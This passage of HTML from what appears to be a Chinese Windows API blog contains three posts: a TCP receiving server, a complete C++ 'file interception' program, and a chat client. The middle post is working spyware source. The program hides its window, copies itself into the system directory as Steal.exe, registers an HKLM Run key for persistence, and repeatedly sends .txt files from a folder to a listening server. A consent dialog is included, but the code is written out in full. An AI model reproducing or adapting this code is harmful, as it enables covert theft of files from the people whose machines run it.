+    </header>
+    <div>
+      
+        <h2 id="文件截取：服务器代码">文件截取：服务器代码</h2>
+<blockquote>
+<p>思路：和正常的TCP发送信息一样：创建一个TCPsocket用来监听是否有连接，然后创建分机TCP处理连接，接收信息到缓冲区。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* errmsg)</span>		<span class="comment">//代替</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fputs</span>(errmsg, stderr);</span><br><span class="line">	<span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">initsocket</span><span class="params">()</span>		<span class="comment">//封装初始化网络库的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ErrHanding</span>(<span class="string">&quot;WSAStartup err&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="built_in">ErrHanding</span>(<span class="string">&quot;LOBYTE err&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> msg[MAX_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">initsocket</span>())</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	SOCKET hServerSock = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == hServerSock)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ErrHanding</span>(<span class="string">&quot;socket err&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(hServerSock, (SOCKADDR*)&amp;addrSrv, <span class="built_in">sizeof</span>(SOCKADDR)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ErrHanding</span>(<span class="string">&quot;bind err&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(hServerSock, <span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">ErrHanding</span>(<span class="string">&quot;listen err&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKADDR_IN addrCli;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">sizeof</span>(SOCKADDR);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	SOCKET clisock;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		clisock = <span class="built_in">accept</span>(hServerSock, (SOCKADDR*)&amp;addrCli, &amp;len);</span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == clisock)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">ErrHanding</span>(<span class="string">&quot;accept err&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">memset</span>(msg, <span class="number">0</span>, MAX_SIZE);</span><br><span class="line">		<span class="keyword">while</span> (len = <span class="built_in">recv</span>(clisock,msg,MAX_SIZE,<span class="number">0</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Server msg: \n%s\n&quot;</span>, msg);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">closesocket</span>(clisock);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">closesocket</span>(hServerSock);</span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_12-%E6%96%87%E4%BB%B6%E6%88%AA%E5%8F%96%EF%BC%9A%E9%9A%90%E8%97%8F%E4%B8%8E%E8%87%AA%E5%90%AF%E5%8A%A8/">12-文件截取：隐藏与自启动</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="文件截取：隐藏与自启动">文件截取：隐藏与自启动</h2>
+<h4 id="1-隐藏自身">1.隐藏自身</h4>
+<blockquote>
+<p>获取窗口句柄，将窗口设置为不可见</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line">	<span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-自启动">2.自启动</h4>
+<blockquote>
+<p>调用函数时，修改exe的名称</p>
+<p>在不需要的时候，需要进入注册表的Software\Microsoft\Windows\CurrentVersion\Run里删除对应exe</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKEY;</span><br><span class="line">	<span class="type">char</span> CurrentPath[MAX_PATH];</span><br><span class="line">	<span class="type">char</span> SysPath[MAX_PATH];</span><br><span class="line">	<span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">	LPSTR FileNewName;</span><br><span class="line">	LPSTR FileCurrentName;</span><br><span class="line">	DWORD type = REG_SZ;</span><br><span class="line">	DWORD size = MAX_PATH;</span><br><span class="line">	LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>; <span class="comment">//regedit win + R</span></span><br><span class="line">		<span class="built_in">GetSystemDirectory</span>(SysPath, size);</span><br><span class="line">	<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, CurrentPath, size);</span><br><span class="line">	<span class="comment">//Copy File</span></span><br><span class="line">	FileCurrentName = CurrentPath;</span><br><span class="line">	FileNewName = <span class="built_in">lstrcat</span>(SysPath, <span class="string">&quot;\\Steal.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d,FileNewName = %s\n&quot;</span>, ret, FileNewName);</span><br><span class="line">	<span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//已经安装！</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line">	<span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">&quot;该程序只允许用于合法的用途！\n 继续运行该程序将使这台机器\</span></span><br><span class="line"><span class="string">		处于被监控的状态！\n 如果您不想这样，请按“取消”按钮退出。\n 按下“是”按钮该程序将被复制\</span></span><br><span class="line"><span class="string">		到您的机器上，并随系统启动自动运行。\n 按下“否”按钮，程序只运行一次，不会在您的系统内留下\</span></span><br><span class="line"><span class="string">		任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line">		<span class="keyword">if</span> (ihow == IDCANCEL)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ihow == IDNO)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//只运行一次</span></span><br><span class="line">		<span class="comment">//复制文件</span></span><br><span class="line">	ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入注册表</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">	ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hKEY);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Set Key</span></span><br><span class="line">	ret = <span class="built_in">RegSetValueEx</span>(hKEY, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)FileNewName, size);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="完整代码">完整代码</h4>
+<blockquote>
+<p>使用管理员权限打开</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">initsocket</span><span class="params">()</span>		<span class="comment">//封装初始化网络库的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">sendToServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">initsocket</span>())</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	FILE* fp = <span class="built_in">fopen</span>(path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line">	<span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">	SOCKET sockCli;</span><br><span class="line">	sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (sockaddr*)&amp;addrSrv, <span class="built_in">sizeof</span>(sockaddr)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, sendBuf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">closesocket</span>(sockCli);</span><br><span class="line">	<span class="built_in">WSACleanup</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//1 遍历路径下所有文件夹</span></span><br><span class="line">	WIN32_FIND_DATA file_for_find;			<span class="comment">//文件数据</span></span><br><span class="line">	HANDLE hListFile;						<span class="comment">//用句柄来标志文件</span></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> szFilePath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">strcpy</span>(szFilePath, szPath);</span><br><span class="line">	<span class="built_in">strcat</span>(szFilePath, <span class="string">&quot;\\*&quot;</span>);</span><br><span class="line">	<span class="comment">//找到第一个文件</span></span><br><span class="line">	hListFile = <span class="built_in">FindFirstFile</span>(szFilePath, &amp;file_for_find);</span><br><span class="line">	<span class="comment">//循环遍历所有文件</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">strcpy</span>(mypath, szPath);</span><br><span class="line">		<span class="built_in">strcat</span>(mypath, file_for_find.cFileName);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(mypath,<span class="string">&quot;.txt&quot;</span>))</span><br><span class="line">			<span class="keyword">while</span> (<span class="built_in">sendToServer</span>(mypath)==<span class="literal">false</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile, &amp;file_for_find));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HKEY hKEY;</span><br><span class="line">	<span class="type">char</span> CurrentPath[MAX_PATH];</span><br><span class="line">	<span class="type">char</span> SysPath[MAX_PATH];</span><br><span class="line">	<span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">	LPSTR FileNewName;</span><br><span class="line">	LPSTR FileCurrentName;</span><br><span class="line">	DWORD type = REG_SZ;</span><br><span class="line">	DWORD size = MAX_PATH;</span><br><span class="line">	LPCTSTR Rgspath = <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>; <span class="comment">//regedit win + R</span></span><br><span class="line">		<span class="built_in">GetSystemDirectory</span>(SysPath, size);</span><br><span class="line">	<span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, CurrentPath, size);</span><br><span class="line">	<span class="comment">//Copy File</span></span><br><span class="line">	FileCurrentName = CurrentPath;</span><br><span class="line">	FileNewName = <span class="built_in">lstrcat</span>(SysPath, <span class="string">&quot;\\Steal.exe&quot;</span>);</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">_finddata_t</span> Steal;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret1 = %d,FileNewName = %s\n&quot;</span>, ret, FileNewName);</span><br><span class="line">	<span class="keyword">if</span> (_findfirst(FileNewName, &amp;Steal) != <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//已经安装！</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret2 = %d\n&quot;</span>, ret);</span><br><span class="line">	<span class="type">int</span> ihow = <span class="built_in">MessageBox</span>(<span class="number">0</span>, <span class="string">&quot;该程序只允许用于合法的用途！\n 继续运行该程序将使这台机器\</span></span><br><span class="line"><span class="string">		处于被监控的状态！\n 如果您不想这样，请按“取消”按钮退出。\n 按下“是”按钮该程序将被复制\</span></span><br><span class="line"><span class="string">		到您的机器上，并随系统启动自动运行。\n 按下“否”按钮，程序只运行一次，不会在您的系统内留下\</span></span><br><span class="line"><span class="string">		任何东西。&quot;</span>, <span class="string">&quot;警告&quot;</span>, MB_YESNOCANCEL | MB_ICONWARNING | MB_TOPMOST);</span><br><span class="line">		<span class="keyword">if</span> (ihow == IDCANCEL)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (ihow == IDNO)</span><br><span class="line">		<span class="keyword">return</span>;<span class="comment">//只运行一次</span></span><br><span class="line">		<span class="comment">//复制文件</span></span><br><span class="line">	ret = <span class="built_in">CopyFile</span>(FileCurrentName, FileNewName, TRUE);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//加入注册表</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret = %d\n&quot;</span>, ret);</span><br><span class="line">	ret = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, Rgspath, <span class="number">0</span>, KEY_WRITE, &amp;hKEY);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Set Key</span></span><br><span class="line">	ret = <span class="built_in">RegSetValueEx</span>(hKEY, <span class="string">&quot;Steal&quot;</span>, <span class="literal">NULL</span>, type, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)FileNewName, size);</span><br><span class="line">	<span class="keyword">if</span> (ret != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">RegCloseKey</span>(hKEY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HideMyself</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hwnd = <span class="built_in">GetForegroundWindow</span>();</span><br><span class="line">	<span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">AddToSystem</span>();</span><br><span class="line">	<span class="built_in">HideMyself</span>();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">DoSteal</span>(<span class="string">&quot;D:\\文件合集\\txt合集\\&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+</article>
+
+    </li>
+  
+    <li>
+      <article class='ListView'>
+    <header class="title">
+      
+        <h1>
+          <a href="/2022/10/27/Windows%20API/2022-10-27_6-%E9%80%9A%E4%BF%A1%E4%BB%A3%E7%A0%81/">6-通信代码</a>
+        </h1>
+      
+      <div class='ListMeta'>
+  <time datetime="2022-10-26T16:00:00.000Z" itemprop="datePublished">
+    2022-10-27
+  </time>
+  
+  
+  / 
+  <ul>
+    
+  <li class="meta-text">
+  { <a href="/categories/Windows-API/">Windows API</a> }
+  </li>
+
+
+  </ul>
+  
+</div>
+
+    </header>
+    <div>
+      
+        <h2 id="通信代码">通信代码</h2>
+<blockquote>
+<p>本代码经过修改可实现一对一实时通信，先启动服务器，再启动客户端</p>
+</blockquote>
+<blockquote>
+<p>记得使用时更改ipv4地址和端口号</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Clint</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WORD wVersionRequested;</span><br><span class="line">	WSADATA wsadata;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsadata);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsadata.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsadata.wVersion) != <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errnum: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="built_in">WSACleanup</span>();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	SOCKET sockCli;</span><br><span class="line">	sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	SOCKADDR_IN addrSrv;</span><br><span class="line">	addrSrv.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;10.7.152.211&quot;</span>);</span><br><span class="line">	addrSrv.sin_family = AF_INET;</span><br><span class="line">	addrSrv.sin_port = <span class="built_in">htons</span>(<span class="number">9999</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (sockaddr*)&amp;addrSrv, <span class="built_in">sizeof</span>(sockaddr)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> recvBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;					<span class="comment">//创建接收消息区</span></span><br><span class="line">	<span class="type">char</span> sendBuf[<span class="number">100</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memset</span>(recvBuf, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">		<span class="type">int</span> iLen = <span class="built_in">recv</span>(sockCli, recvBuf, <span class="number">100</span>, <span class="number">0</span>);		<span class="comment">//阻塞等待消息</span></span><br><span class="line">		<span class="keyword">if</span> (iLen == SOCKET_ERROR)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;recvBuf : %s\n&quot;</span>, recvBuf);</span><br><span class="line">		<span class="built_in">memset</span>(sendBuf, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;send: &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, sendBuf);</span><br><span class="line">		iLen = <span class="built_in">send</span>(sockCli, sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (iLen == SOCKET_ERROR)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">closesocket</span>(sockCli);</span><br><span class="line">	